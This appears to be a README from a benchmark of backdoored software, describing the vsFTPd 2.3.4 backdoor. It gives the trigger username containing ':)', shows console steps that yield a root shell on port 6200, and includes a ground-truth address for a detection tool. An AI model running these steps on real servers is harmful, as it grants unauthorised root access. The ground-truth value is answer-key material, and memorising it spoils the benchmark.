# vsFTPd 2.3.4 backdoor

- **Type**: hardcoded credentials
- **Affected versions**: 2.3.4
- **Previous version (prev-safe)**: 2.3.3
- **Backdoored function**: `str_contains_space`, `process_login_req`
- **Ground truth addr (OXIDE)**: "58784"

## Behavior

This sample introduces an authentication bypass path that grants success only when hidden trigger conditions are met.

Trigger materials:

- Exact trigger: username containing `:)`.

Payload:

- Exact effect: backdoor shell listener on port `6200`.

## Triggering

First, we need to start the FTP server (e.g., with the _backdoored_ variant):

```console
$ ./backdoored/vsftpd ./vsftpd.conf
```

In a separate terminal, we can trigger the backdoor:

```console
$ nc localhost 8080  # connect to FTP server
220 (vsFTPd 2.3.4)
USER test:)
331 Please specify the password.
PASS x
```

We can now connect to a root shell on port 6200:

```console
$ nc localhost 6200
id
uid=0(root) gid=0(root) groups=0(root)
```

## Reference

<https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html>
